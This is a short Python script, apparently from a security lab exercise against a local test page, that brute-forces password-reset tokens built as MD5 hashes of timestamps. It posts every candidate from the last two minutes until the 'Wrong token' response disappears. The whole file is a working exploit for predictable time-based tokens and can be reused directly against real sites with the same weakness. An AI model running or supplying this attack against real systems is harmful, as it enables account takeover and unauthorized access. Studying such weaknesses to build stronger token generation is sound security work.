from hashlib import md5
import requests
from sys import exit
from time import time

url = "http://127.0.0.1/reset_token_time.php"

# to have a wide window try to bruteforce starting from 120seconds ago
now        = int(time())
start_time = now - 120
fail_text  = "Wrong token"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, now + 1):
    # get token md5
    md5_token = md5(str(x).encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(x), md5_token))

    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()

